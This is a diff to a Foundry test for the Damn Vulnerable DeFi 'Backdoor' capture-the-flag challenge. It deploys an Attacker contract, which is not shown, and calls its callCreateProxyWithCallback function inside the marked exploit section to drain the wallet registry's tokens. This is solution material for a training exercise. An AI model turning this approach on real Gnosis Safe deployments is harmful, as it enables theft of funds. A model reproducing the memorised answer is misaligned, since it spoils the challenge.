@@ -8,6 +8,7 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {Attacker} from "../../../src/Contracts/backdoor/Attacker.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -18,6 +19,8 @@ contract Backdoor is Test {
     GnosisSafe internal masterCopy;
     GnosisSafeProxyFactory internal walletFactory;
     WalletRegistry internal walletRegistry;
+    Attacker internal att;
+
     address[] internal users;
     address payable internal attacker;
     address internal alice;
@@ -72,6 +75,8 @@ contract Backdoor is Test {
         // Transfer tokens to be distributed to the registry
         dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
 
+        vm.prank(attacker);
+        att = new Attacker(address(walletFactory), address(dvt), address(walletRegistry));
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -79,6 +84,8 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        att.callCreateProxyWithCallback(address(masterCopy), users);
 
         /**
          * EXPLOIT END *
